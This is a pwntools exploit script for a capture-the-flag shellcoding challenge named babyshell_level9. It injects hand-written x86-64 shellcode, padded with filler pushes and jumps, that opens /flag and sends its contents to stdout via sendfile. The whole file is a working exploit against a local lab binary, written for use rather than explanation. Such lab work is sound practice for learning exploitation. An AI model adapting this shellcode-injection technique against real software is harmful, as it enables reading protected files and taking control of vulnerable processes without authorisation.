#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/babyshell_level9
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyshell_level9')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      PIE enabled
# Stack:    Executable
# RWX:      Has RWX segments
# SHSTK:    Enabled
# IBT:      Enabled

io = start()

shellcode = asm("""
mov ax, 2
jmp . + 16

push 0x0
push 0x0
push 0x12345678
push 0x12345678

lea rdi, [rip+file]
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

mov rsi, 0
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

mov rdx, 0
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

syscall
push 0x12345678
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

mov rdi, 1
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

mov rsi, rax
push 0x0
push 0x0
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

mov rdx, 0
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

mov r10, 1000
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

mov rax, 40
jmp . + 13

push 0x12345678
push 0x0
mov ax, 2

syscall
file:
    .string "/flag"
""")
print(disasm(shellcode))
payload = fit(shellcode)
io.sendline(payload)

io.interactive()

